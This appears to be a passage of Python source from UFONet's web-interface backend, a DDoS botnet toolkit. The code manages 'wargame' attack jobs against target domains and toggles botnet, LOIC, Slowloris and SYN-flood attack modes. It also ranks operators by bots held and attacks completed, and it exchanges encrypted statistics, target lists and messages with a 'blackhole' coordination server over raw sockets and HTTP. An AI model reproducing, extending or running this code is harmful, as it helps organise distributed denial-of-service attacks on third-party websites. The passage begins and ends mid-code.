                self.pages["/cmd_job_remove_all_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_edit_supply":
            self.pages["/cmd_edit_supply"] = "<pre>Changing 'Global Army Supply' configuration...</pre>"
            try:
                supply_botnet = pGet["botnet"]
                supply_loic = pGet["loic"]
                supply_loris = pGet["loris"]
                supply_ufosyn = pGet["ufosyn"]
            except: # default global supply army
                supply_botnet = 1
                supply_loic = 0
                supply_loris = 0
                supply_ufosyn = 0
            with open(self.mothership_supplycfg_file, "w") as f:
                json.dump({"botnet": supply_botnet, "loic": supply_loic, "loris": supply_loris, "ufosyn": supply_ufosyn}, f, indent=4)
        if page == "/cmd_job_add":
            self.pages["/cmd_job_add"] = "<pre>Adding wargame to your list...</pre>"
            try:
                job_params = pGet["id"]
                sep = ","
                job_id = job_params.rsplit(sep, 1)[0]
            except:
                job_id = ""
            if job_id is not "":
                self.list_wargames.reverse() 
                try:
                    job_task = self.list_wargames[(int(job_id)-1)]
                    f = open(self.wargames_file,"r")
                    ls = f.readlines()
                    f.close()
                    f = open(self.wargames_file,"w")
                    sep = "#-#"
                    for l in ls:
                        if str(l) != str(job_task):
                            f.write(l)
                        else:
                            job_t2 = job_task.rsplit(sep, 1)[0]
                            job_creation = job_t2.rsplit(sep, 1)[0]
                            job_target = job_t2.rsplit(sep, 1)[1]
                            job_estimated = job_task.rsplit(sep, 1)[1]
                            l = str(job_creation) + "#-#" + str(job_target) + "!!!#-#" + str(job_estimated) # '!!!' target marked as job
                            f.write(l)
                    f.close()
                except:
                    pass
        if page == "/cmd_job_add_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_job_add_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_job_add_all":
            self.pages["/cmd_job_add_all"] = "<pre>Engaging ALL -ONGOING- wargames... ;-)</pre>"
            try:
                self.list_wargames.reverse()
                f = open(self.wargames_file,"r")
                ls = f.readlines()
                f.close()
                f = open(self.wargames_file,"w")
                sep = "#-#"
                for l in ls:
                    job_t2 = l.rsplit(sep, 1)[0]
                    job_creation = job_t2.rsplit(sep, 1)[0]
                    job_target = job_t2.rsplit(sep, 1)[1]
                    job_estimated = l.rsplit(sep, 1)[1]
                    if not "!!!" in job_target:
                        l = str(job_creation) + "#-#" + str(job_target) + "!!!#-#" + str(job_estimated)
                    else:
                        l = str(job_creation) + "#-#" + str(job_target) + "#-#" + str(job_estimated)
                    f.write(l)
                f.close()
            except:
                pass
        if page == "/cmd_job_add_all_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_job_add_all_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_job_cancel":
            self.pages["/cmd_job_cancel"] = "<pre>Canceling wargame from your list...</pre>"
            try:
                job_params = pGet["id"]
                sep = ","
                job_id = job_params.rsplit(sep, 1)[0]
            except:
                job_id = ""
            if job_id is not "":
                self.list_wargames.reverse() 
                try:
                    job_task = self.list_wargames[(int(job_id)-1)]
                    f = open(self.wargames_file,"r")
                    ls = f.readlines()
                    f.close()
                    f = open(self.wargames_file,"w")
                    for l in ls:
                        if str(l) != str(job_task):
                            f.write(l)
                        else:
                            sep = "#-#"
                            job_t2 = job_task.rsplit(sep, 1)[0]
                            job_creation = job_t2.rsplit(sep, 1)[0]
                            job_target = job_t2.rsplit(sep, 1)[1]
                            job_target = job_target.replace("!!!","") # undo target marked as job (unjob)
                            job_estimated = job_task.rsplit(sep, 1)[1]
                            l = str(job_creation) + "#-#" + str(job_target) + "#-#" + str(job_estimated)
                            f.write(l)
                    f.close()
                except:
                    pass
        if page == "/cmd_job_cancel_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_job_cancel_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_job_cancel_all":
            self.pages["/cmd_job_cancel_all"] = "<pre>Canceling ALL -JOINED- wargames from your list...</pre>"
            try:
                self.list_wargames.reverse()
                f = open(self.wargames_file,"r")
                ls = f.readlines()
                f.close()
                f = open(self.wargames_file,"w")
                sep = "#-#"
                for l in ls:
                    job_t2 = l.rsplit(sep, 1)[0]
                    job_creation = job_t2.rsplit(sep, 1)[0]
                    job_target = job_t2.rsplit(sep, 1)[1]
                    job_target = job_target.replace("!!!","") # undo target marked as job (unjob)
                    job_estimated = l.rsplit(sep, 1)[1]
                    l = str(job_creation) + "#-#" + str(job_target) + "#-#" + str(job_estimated)
                    f.write(l)
                f.close()
            except:
                pass
        if page == "/cmd_job_cancel_all_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_job_cancel_all_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_job_filter":
            try:
                job_filter = pGet["filter"]
                job_key = pGet["key"]
            except:
                job_filter = "creation"
                job_key = str(self.crypto_key)
            self.pages["/cmd_job_filter"] = "<pre>Ordering wargames by: "+job_filter+"</pre>"
            nodec_text = "KEY?"
            try:
                wargames_items=[]
                f = open(self.wargames_file,"r")
                ls = f.readlines()
                f.close()
                f = open(self.wargames_file,"w")
                for j in ls:
                    if wargames_msg_sep in j:
                        m = j.split(wargames_msg_sep)
                        wargames_creation = m[0] # creation date
                        self.decrypt(job_key, wargames_creation)
                        if self.decryptedtext:
                            wargames_creation = self.decryptedtext
                        else:
                            wargames_creation = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        wargames_target = m[1] # target
                        self.decrypt(job_key, wargames_target)
                        if self.decryptedtext:
                            wargames_target = self.decryptedtext
                            if wargames_target.startswith("www."):
                                wargames_target = wargames_target.replace("www.","")
                        else:
                            wargames_target = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        wargames_estimated = m[2] # estimated date
                        self.decrypt(job_key, wargames_estimated)
                        if self.decryptedtext:
                            wargames_estimated = self.decryptedtext
                        else:
                            wargames_estimated = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        wargames_creation = strptime(wargames_creation, "%d-%m-%Y %H:%M:%S")
                        wargames_estimated = strptime(wargames_estimated, "%d-%m-%Y %H:%M:%S")
                        wargames_items.append([wargames_creation,wargames_target,wargames_estimated])
                if job_filter == "creation":
                    wargames_items=sorted(wargames_items,key=lambda x:x[0]) # sorted by creation
                elif job_filter == "target": 
                    wargames_items=sorted(wargames_items,key=lambda x:x[1]) # sorted by target
                elif job_filter == "estimated": 
                    wargames_items=sorted(wargames_items,key=lambda x:x[2]) # sorted by estimated
                else:
                    wargames_items=sorted(wargames_items,key=lambda x:x[0]) # sorted by creation
                for i in wargames_items:
                    wargames_creation = i[0]
                    wargames_creation = strftime("%d-%m-%Y %H:%M:%S", wargames_creation)
                    self.encrypt(job_key, wargames_creation)
                    if self.encryptedtext:
                        wargames_creation = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    wargames_target = str(i[1])
                    self.encrypt(job_key, wargames_target)
                    if self.encryptedtext:
                        wargames_target = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    wargames_estimated = i[2]
                    wargames_estimated = strftime("%d-%m-%Y %H:%M:%S", wargames_estimated)
                    self.encrypt(job_key, wargames_estimated)
                    if self.encryptedtext:
                        wargames_estimated = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer  
                    l = str(wargames_creation) + "#-#" + str(wargames_target) + "#-#" + str(wargames_estimated)
                    f.write(l + os.linesep)
                f.close()
            except:
                pass
        if page == "/cmd_job_filter_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_job_filter_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_grid_filter":
            try:
                grid_filter = pGet["filter"]
                grid_key = pGet["key"]
            except:
                grid_filter = "missions" # default grid order by
                grid_key = str(self.crypto_key)
            self.pages["/cmd_grid_filter"] = "<pre>Ordering grid by: "+grid_filter+"</pre>"
            nodec_text = "KEY?"
            nodec_num = 0
            try:
                grid_items=[]
                f = open(self.grid_file,"r")
                ls = f.readlines()
                f.close()
                f = open(self.grid_file,"w")
                for j in ls:
                    if grid_msg_sep in j:
                        version = j.count(grid_msg_sep) # check UFONet stream version (10->0.9|11->1.0|12->1.1)
                        m = j.split(grid_msg_sep)
                        grid_nickname = m[0] # nickname
                        self.decrypt(grid_key, grid_nickname)
                        if self.decryptedtext:
                            grid_nickname = str(self.decryptedtext)
                        else:
                            grid_nickname = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        grid_ranking = m[1] # ranking
                        self.decrypt(grid_key, grid_ranking)
                        if self.decryptedtext:
                            try:
                                grid_ranking = int(self.decryptedtext)
                            except:
                                grid_ranking = nodec_num
                        else:
                            grid_ranking = nodec_num
                        self.decryptedtext = "" # clean decryptedtext buffer
 			grid_totalchargo = m[2] # total chargo
                        self.decrypt(grid_key, grid_totalchargo)
                        if self.decryptedtext:
                            try:
                                grid_totalchargo = int(self.decryptedtext)
                            except:
                                grid_totalchargo = nodec_num
                        else:
                            grid_totalchargo = nodec_num
                        self.decryptedtext = "" # clean decryptedtext buffer
                        grid_dorking = m[3] # dorking
                        self.decrypt(grid_key, grid_dorking)
                        if self.decryptedtext:
                            try:
                                grid_dorking = int(self.decryptedtext)
                            except:
                                grid_dorking = nodec_num
                        else:
                            grid_dorking = nodec_num
                        self.decryptedtext = "" # clean decryptedtext buffer
                        grid_transferred = m[4] # transferred
                        self.decrypt(grid_key, grid_transferred)
                        if self.decryptedtext:
                            try:
                                grid_transferred = int(self.decryptedtext)
                            except:
                                grid_transferred = nodec_num
                        else:
                            grid_transferred = nodec_num
                        self.decryptedtext = "" # clean decryptedtext buffer
                        grid_maxchargo = m[5] # maxchargo
			self.decrypt(grid_key, grid_maxchargo)
                        if self.decryptedtext:
                            try:
                                grid_maxchargo = int(self.decryptedtext)
                            except:
                                grid_maxchargo = nodec_num
                        else:
                            grid_maxchargo = nodec_num
                        self.decryptedtext = "" # clean decryptedtext buffer
                        grid_missions = m[6] # missions
                        self.decrypt(grid_key, grid_missions)
                        if self.decryptedtext:
                            try:
                                grid_missions = int(self.decryptedtext)
                            except:
                                grid_missions = nodec_num
                        else:
                            grid_missions = nodec_num
                        self.decryptedtext = "" # clean decryptedtext buffer
                        grid_attacks = m[7] # attacks
                        self.decrypt(grid_key, grid_attacks)
                        if self.decryptedtext:
                            try:
                                grid_attacks = int(self.decryptedtext)
                            except:
                                grid_attacks = nodec_num
                        else:
                            grid_attacks = nodec_num
			self.decryptedtext = "" # clean decryptedtext buffer
                        grid_loic = m[8] # loic
                        self.decrypt(grid_key, grid_loic)
                        if self.decryptedtext:
                            try:
                                grid_loic = int(self.decryptedtext)
                            except:
                                grid_loic = nodec_num
                        else:
                            grid_loic = nodec_num
                        if version == 12: # v1.1
                            grid_loris = m[9] # loris
                            self.decrypt(grid_key, grid_loris)
                            if self.decryptedtext:
                                try:
                                    grid_loris = int(self.decryptedtext)
                                except:
                                    grid_loris = nodec_num
                            else:
                                grid_loris = nodec_num
                            self.decryptedtext = "" # clean decryptedtext buffer
                            grid_ufosyn = m[10] # ufosyn
                            self.decrypt(grid_key, grid_ufosyn)
                            if self.decryptedtext:
                                try:
                                    grid_ufosyn = int(self.decryptedtext)
                                except:
                                    grid_ufosyn = nodec_num
                            else:
                                grid_ufosyn = nodec_num
                            self.decryptedtext = "" # clean decryptedtext buffer
                            grid_contact = m[11] # contact
                            self.decrypt(grid_key, grid_contact)
                            if self.decryptedtext:
                                grid_contact = self.decryptedtext
                            else:
                                grid_contact = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer      
                            grid_id = m[12] # id    
                        elif version == 11: # v1.0
                            grid_loris = m[9] # loris
                            self.decrypt(grid_key, grid_loris)
                            if self.decryptedtext:
                                try:
                                    grid_loris = int(self.decryptedtext)
                                except:
                                    grid_loris = nodec_num
                            else:
                                grid_loris = nodec_num
                            self.decryptedtext = "" # clean decryptedtext buffer
                            grid_ufosyn = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==") # not ufosyn present
                            self.decrypt(grid_key, grid_ufosyn)
                            if self.decryptedtext:
                                try:
                                    grid_ufosyn = int(self.decryptedtext)
                                except:
                                    grid_ufosyn = nodec_num
                            else:
                                grid_ufosyn = nodec_num
                            self.decryptedtext = "" # clean decryptedtext buffer
                            grid_contact = m[10] # contact
                            self.decrypt(grid_key, grid_contact)
                            if self.decryptedtext:
                                grid_contact = self.decryptedtext
                            else:
                                grid_contact = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer      
                            grid_id = m[11] # id
                        elif version == 10: # v0.9
                            grid_loris = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==") # not loris present
                            self.decrypt(grid_key, grid_loris)
                            if self.decryptedtext:
                                try:
                                    grid_loris = int(self.decryptedtext)
                                except:
                                    grid_loris = nodec_num
                            else:
                                grid_loris = nodec_num
                            self.decryptedtext = "" # clean decryptedtext buffer
                            grid_ufosyn = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==") # not ufosyn present
                            self.decrypt(grid_key, grid_ufosyn)
                            if self.decryptedtext:
                                try:
                                    grid_ufosyn = int(self.decryptedtext)
                                except:
                                    grid_ufosyn = nodec_num
                            else:
                                grid_ufosyn = nodec_num
                            self.decryptedtext = "" # clean decryptedtext buffer                      
                            grid_contact = m[9] # contact
                            self.decrypt(grid_key, grid_contact)
                            if self.decryptedtext:
                                grid_contact = self.decryptedtext
                            else:
                                grid_contact = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer      
                            grid_id = m[10] # id    
                        else: # no valid version
                            pass
                        grid_items.append([str(grid_nickname),int(grid_ranking),int(grid_totalchargo),int(grid_dorking),int(grid_transferred),int(grid_maxchargo),int(grid_missions),int(grid_attacks),int(grid_loic),int(grid_loris),int(grid_ufosyn),str(grid_contact),str(grid_id)])
                if grid_filter == "nickname":
                    grid_items=sorted(grid_items,key=lambda x:x[0]) # sorted by nickname
                elif grid_filter == "ranking": 
                    grid_items=sorted(grid_items,key=lambda x:x[1]) # sorted by ranking
                elif grid_filter == "chargo":
                    grid_items=sorted(grid_items,key=lambda x:x[2]) # sorted by totalchargo 
                elif grid_filter == "dorking":
                    grid_items=sorted(grid_items,key=lambda x:x[3]) # sorted by dorking
                elif grid_filter == "transferred":
                    grid_items=sorted(grid_items,key=lambda x:x[4]) # sorted by transferred
                elif grid_filter == "maxchargo":
                    grid_items=sorted(grid_items,key=lambda x:x[5]) # sorted by maxchargo
                elif grid_filter == "missions":
                    grid_items=sorted(grid_items,key=lambda x:x[6]) # sorted by missions
                elif grid_filter == "attacks":
                    grid_items=sorted(grid_items,key=lambda x:x[7]) # sorted by attacks
                elif grid_filter == "loic":
                    grid_items=sorted(grid_items,key=lambda x:x[8]) # sorted by loic
                elif grid_filter == "loris":
                    grid_items=sorted(grid_items,key=lambda x:x[9]) # sorted by loris
                elif grid_filter == "ufosyn":
                    grid_items=sorted(grid_items,key=lambda x:x[10]) # sorted by ufosyn
                elif grid_filter == "contact":
                    grid_items=sorted(grid_items,key=lambda x:x[11]) # sorted by contact
                else:
                    grid_items=sorted(grid_items,key=lambda x:x[6]) # sorted by missions (default)
                for i in grid_items:
                    grid_nickname = str(i[0])
                    self.encrypt(grid_key, grid_nickname)
                    if self.encryptedtext:
                        grid_nickname = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    grid_ranking = str(i[1])
                    self.encrypt(grid_key, grid_ranking)
                    if self.encryptedtext:
                        grid_ranking = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    grid_totalchargo = str(i[2])
                    self.encrypt(grid_key, grid_totalchargo)
                    if self.encryptedtext:
                        grid_totalchargo = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    grid_dorking = str(i[3])
                    self.encrypt(grid_key, grid_dorking)
                    if self.encryptedtext:
                        grid_dorking = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    grid_transferred = str(i[4])
                    self.encrypt(grid_key, grid_transferred)
                    if self.encryptedtext:
                        grid_transferred = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    grid_maxchargo = str(i[5])
                    self.encrypt(grid_key, grid_maxchargo)
                    if self.encryptedtext:
                        grid_maxchargo = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    grid_missions = str(i[6])
                    self.encrypt(grid_key, grid_missions)
                    if self.encryptedtext:
                        grid_missions = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    grid_attacks = str(i[7])
                    self.encrypt(grid_key, grid_attacks)
                    if self.encryptedtext:
                        grid_attacks = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    grid_loic = str(i[8])
                    self.encrypt(grid_key, grid_loic)
                    if self.encryptedtext:
                        grid_loic = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    grid_loris = str(i[9])
                    self.encrypt(grid_key, grid_loris)
                    if self.encryptedtext:
                        grid_loris = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    grid_ufosyn = str(i[10])
                    self.encrypt(grid_key, grid_ufosyn)
                    if self.encryptedtext:
                        grid_ufosyn = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    grid_contact = str(i[11])
                    self.encrypt(grid_key, grid_contact)
                    if self.encryptedtext:
                        grid_contact = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    grid_id = str(i[12]) # id (plain id)
                    l = str(grid_nickname) + "#?#" + str(grid_ranking) + "#?#" + str(grid_totalchargo) + "#?#" + str(grid_dorking) + "#?#" + str(grid_transferred) + "#?#" + str(grid_maxchargo) + "#?#" + str(grid_missions) + "#?#" + str(grid_attacks) + "#?#" + str(grid_loic) + "#?#" + str(grid_loris) + "#?#" + str(grid_ufosyn) + "#?#" + str(grid_contact) + "#?#" + str(grid_id)
                    f.write(l)
                f.close()
            except:
                pass
        if page == "/cmd_grid_filter_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_grid_filter_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_transfer_grid":
            self.pages["/cmd_transfer_grid"] = "<pre>Waiting for 'blackhole' connection...</pre>"
            blackhole_ip = pGet["grid_source"]
            blackhole_ip = urllib.unquote(blackhole_ip).decode('utf8')
            try:
                grid_key = pGet["grid_key"]
            except:
                grid_key = ""
            end_mark = "\n[Mothership/Info] End of transmission. Refreshing grid..."
            if grid_key is not "": # stream creation + encryption + package send
                try:
                    grid_json_file = open(self.mothership_gridcfg_file, "r") # extract grid profile conf
                    grid_data = json.load(grid_json_file)
                    grid_json_file.close()
                    stats_json_file = open(self.mothership_stats_file, "r") # extract mothership stats
                    stats_data = json.load(stats_json_file)
                    stats_json_file.close()
                    nickname = grid_data["grid_nick"].encode('utf-8')
                    self.encrypt(grid_key, nickname)
                    if self.encryptedtext:
                        nickname = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer   
                    ranking = self.ranking
                    if ranking == "Rookie":
                        ranking = 1
                    elif ranking == "Mercenary":
                        ranking = 2
                    elif ranking == "Bandit":
                        ranking = 3
                    elif ranking == "UFOmmander!":
                        ranking = 4           
                    else:
                        ranking = 1
                    self.encrypt(grid_key, str(ranking))
                    if self.encryptedtext:
                        ranking = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer   
                    chargo = self.total_botnet
                    self.encrypt(grid_key, str(chargo))
                    if self.encryptedtext:
                        chargo = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer  
                    dorking = stats_data["scanner"]
                    self.encrypt(grid_key, str(dorking))
                    if self.encryptedtext:
                        dorking = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer  
                    transferred = stats_data["transferred"]
                    self.encrypt(grid_key, str(transferred))
                    if self.encryptedtext:
                        transferred = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer  
                    max_chargo = stats_data["max_chargo"]
                    self.encrypt(grid_key, str(max_chargo))
                    if self.encryptedtext:
                        max_chargo = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer  
                    missions = stats_data["missions"]
                    self.encrypt(grid_key, str(missions))
                    if self.encryptedtext:
                        missions = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer  
                    attacks = stats_data["completed"]
                    self.encrypt(grid_key, str(attacks))
                    if self.encryptedtext:
                        attacks = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer  
                    loic = stats_data["loic"]
                    self.encrypt(grid_key, str(loic))
                    if self.encryptedtext:
                        loic = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer  
                    loris = stats_data["loris"]
                    self.encrypt(grid_key, str(loris))
                    if self.encryptedtext:
                        loris = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    ufosyn = stats_data["ufosyn"]
                    self.encrypt(grid_key, str(ufosyn))
                    if self.encryptedtext:
                        ufosyn = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer  
                    contact = grid_data["grid_contact"].encode('utf-8')
                    self.encrypt(grid_key, str(contact))
                    if self.encryptedtext:
                        contact = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer  
                    id = grid_data["grid_token"] #  plain text
                    stream = str(nickname)+grid_msg_sep+str(ranking)+grid_msg_sep+str(chargo)+grid_msg_sep+str(dorking)+grid_msg_sep+str(transferred)+grid_msg_sep+str(max_chargo)+grid_msg_sep+str(missions)+grid_msg_sep+str(attacks)+grid_msg_sep+str(loic)+grid_msg_sep+str(loris)+grid_msg_sep+str(ufosyn)+grid_msg_sep+str(contact)+grid_msg_sep+str(id)
                    try: 
                        host = blackhole_ip
                        cport = 9992 # port used by mothership grider (server side script)
                        gs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        gs.settimeout(5.0)
                        gs.connect((host, cport))
                        gs.send(stream)
                        gs.close()
                        try: # download latest grid after submit
                            grid = urllib2.urlopen('http://'+blackhole_ip+'/ufonet/grid.txt').read()
                            f = open(self.grid_file, "w") # write updates to grid.txt
                            f.write(str(grid))
                            f.close()
                        except:
                            pass
                        grid_trans = "[Mothership/Info] Congratulations. Statistics successfully transferred...\n"
                    except:
                        grid_trans = "[Mothership/Error] Something wrong when uploading statistics to this grid. Try it again...\n"
                except:
                    grid_trans = "[Mothership/Error] Something wrong when uploading statistics to this grid. Try it again...\n"
            end_mark = "\n[Mothership/Info] End of transmission. Refreshing grid..."
            f = open("/tmp/out", "w")
            f.write(grid_trans)
            f.write(end_mark)
            f.close()
        if page == "/cmd_transfer_grid_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_transfer_grid_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_transfer_wargame":
            self.pages["/cmd_transfer_wargame"] = "<pre>Waiting for 'blackhole' connection...</pre>"
            blackhole_ip = pGet["wargames_source2"]
            blackhole_ip = urllib.unquote(blackhole_ip).decode('utf8')
            try:
                wargames_enckey = pGet["wargames_enckey"]
            except:
                wargames_enckey = ""
            wargames_creation = strftime("%d-%m-%Y %H:%M:%S", gmtime())
            wargames_target = pGet["wargames_target"]
            if wargames_target.startswith("http://") or wargames_target.startswith("https://"): # parse proposed target url
                t = urlparse(str(wargames_target))
                wargames_target = t.netloc
            else:
                wargames_trans = "[Mothership/Error] Proposed target is not using a correct format!. Try it again...\n"
                wargames_enckey = ""
            if wargames_target.startswith("www."):
                wargames_target = wargames_target.replace("www.","")
            wargames_estimated = pGet["wargames_estimated"]
            try:
                wargames_creation = strptime(wargames_creation, "%d-%m-%Y %H:%M:%S")
                wargames_estimated = strptime(wargames_estimated, "%d-%m-%Y %H:%M:%S")
                if (wargames_creation > wargames_estimated) == True: # parse bad dates
                    wargames_trans = "[Mothership/Error] Date time should be major than creation time. Try it again...\n"
                    wargames_enckey = ""
            except:
                wargames_trans = "[Mothership/Error] Date time is not using a correct format!. Try it again...\n"
                wargames_enckey = ""
            end_mark = "\n[Mothership/Info] End of transmission. Refreshing wargames..."
            if wargames_enckey is not "": # stream creation + encryption + package send
                wargames_creation = strftime("%d-%m-%Y %H:%M:%S", wargames_creation)
                wargames_estimated = strftime("%d-%m-%Y %H:%M:%S", wargames_estimated)
                try:
                    self.encrypt(wargames_enckey, wargames_creation)
                    if self.encryptedtext:
                        wargames_creation = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    self.encrypt(wargames_enckey, wargames_target)
                    if self.encryptedtext:
                        wargames_target = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer 
                    self.encrypt(wargames_enckey, wargames_estimated)
                    if self.encryptedtext:
                        wargames_estimated = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    stream = str(wargames_creation)+wargames_msg_sep+str(wargames_target)+wargames_msg_sep+str(wargames_estimated)
                    try: 
                        host = blackhole_ip
                        cport = 9992 # port used by mothership grider (server side script)
                        gs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        gs.settimeout(5.0)
                        gs.connect((host, cport))
                        gs.send(stream)
                        gs.close()
                        try: # download latest wargames after submit
                            wargames = urllib2.urlopen('http://'+blackhole_ip+'/ufonet/wargames.txt').read()
                            f = open(self.wargames_file, "w") # write updates to wargames.txt
                            f.write(str(wargames))
                            f.close()
                        except:
                            pass
                        wargames_trans = "[Mothership/Info] Congratulations. Wargame successfully transferred...\n"
                    except:
                        wargames_trans = "[Mothership/Error] Something wrong when uploading wargame. Try it again...\n"
                except:
                    wargames_trans = "[Mothership/Error] Something wrong when uploading wargame. Try it again...\n"
            end_mark = "\n[Mothership/Info] End of transmission. Refreshing wargames..."
            f = open("/tmp/out", "w")
            f.write(wargames_trans)
            f.write(end_mark)
            f.close()
        if page == "/cmd_transfer_wargame_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_transfer_wargame_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_sync_board":
            self.pages["/cmd_sync_board"] = "<pre>Waiting for 'blackhole' reply...</pre>"
            blackhole_ip = pGet["board_source"]
            blackhole_ip = urllib.unquote(blackhole_ip).decode('utf8')
            try:
                board = urllib2.urlopen('http://'+blackhole_ip+'/ufonet/board.txt').read()
                f = open(self.board_file, "w") # write updates to board.txt
                f.write(str(board))
                f.close()
                self.board_text = board
            except:
                board = "[Mothership/Error] Something wrong downloading. Try it again or using another source...\n"
            end_mark = "\n[Mothership/Info] End of transmission. Refreshing board..."
            f = open("/tmp/out", "w")
            f.write(str(board))
            f.write(end_mark)
            f.close()
        if page == "/cmd_sync_board_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                stream = f.read()
                stream = re.sub("(.{100})", "\\1\n", stream, 0, re.DOTALL) # regex magics! (set visual stream to 100 chars after \n)
                self.pages["/cmd_sync_board_update"] = "<pre>"+stream+"<pre>"
        if page == "/cmd_send_message_board":
            self.pages["/cmd_send_message_board"] = "<pre>Waiting for 'blackhole' connection...</pre>"
            blackhole_ip = pGet["board_source"]
            blackhole_ip = urllib.unquote(blackhole_ip).decode('utf8')
            try:
                board_key = pGet["board_key"]
            except:
                board_key = ""
            try:
                board_topic = pGet["board_topic"]
            except:
                board_topic = ""
            try:
                board_message = pGet["stream_txt"]
            except:
                board_message = ""
            end_mark = "\n[Mothership/Info] End of transmission. Refreshing board..."
            if board_key is not "" or board_topic is not "" or board_message is not "": # stream creation (topic | icon | nick | id | comment) + encryption (board_key) + package send (default blackhole)
                try:  
                    board_json_file = open(self.mothership_boardcfg_file, "r") # extract board profile conf
                    board_data = json.load(board_json_file)
                    board_json_file.close()         
                    board_nickname = board_data["profile_nick"]
                    self.encrypt(board_key, board_nickname)
                    if self.encryptedtext:
                        board_nickname = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer 
                    board_icon = board_data["profile_icon"]
                    board_icon = board_icon.replace("link", "") # keep just icon number
                    board_id = board_data["profile_token"] 
                    self.encrypt(board_key, board_message)
                    if self.encryptedtext:
                        board_message = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    if board_topic == "general":
                        board_topic = 1
                    elif board_topic == "opsec":
                        board_topic = 2
                    elif board_topic == "faq":
                        board_topic = 3
                    elif board_topic == "bugs":
                        board_topic = 4  
                    elif board_topic == "media":
                        board_topic = 5            
                    else:
                        board_topic = 1
                    stream = str(board_topic)+board_msg_sep+str(board_icon)+board_msg_sep+str(board_nickname)+board_msg_sep+str(board_id)+board_msg_sep+str(board_message)
                    try: 
                        host = blackhole_ip
                        cport = 9992 # port used by mothership grider (server side script)
                        gs = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
                        gs.settimeout(5.0)
                        gs.connect((host, cport))
                        gs.send(stream)
                        gs.close()
                        try: # download latest board after submit
                            board = urllib2.urlopen('http://'+blackhole_ip+'/ufonet/board.txt').read()
                            f = open(self.board_file, "w") # write updates to board.txt
                            f.write(str(board))
                            f.close()
                        except:
                            pass
                        board_trans = "[Mothership/Info] Congratulations. The message has been sent successfully...\n"
                    except:
